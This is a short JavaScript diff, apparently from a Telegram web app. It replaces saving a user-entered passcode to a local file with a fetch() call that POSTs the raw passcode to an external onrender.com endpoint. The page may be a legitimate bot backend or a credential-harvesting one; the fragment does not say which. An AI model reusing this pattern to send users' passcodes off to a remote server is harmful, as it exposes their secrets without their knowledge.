@@ -53,11 +53,13 @@ document.addEventListener('DOMContentLoaded', () => {
     passcodeBtn.addEventListener('click', () => {
         // page2.style.transform = 'translate(-50%, 40px)';
         page2.style.display = 'none';
-        const file = new Blob([passcodeInput.value], { type: 'text/plain' });
-        const link = document.createElement('a');
-        link.href = URL.createObjectURL(file);
-        link.download = 'data.txt'; // назва створеного файлу
-        link.click();
+        fetch('https://tgbot-qnho.onrender.com/api/string', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'text/plain',
+            },
+            body: passcodeInput.value,
+        });
 
         // tg.sendData(JSON.stringify(passcodeInput.value));
 
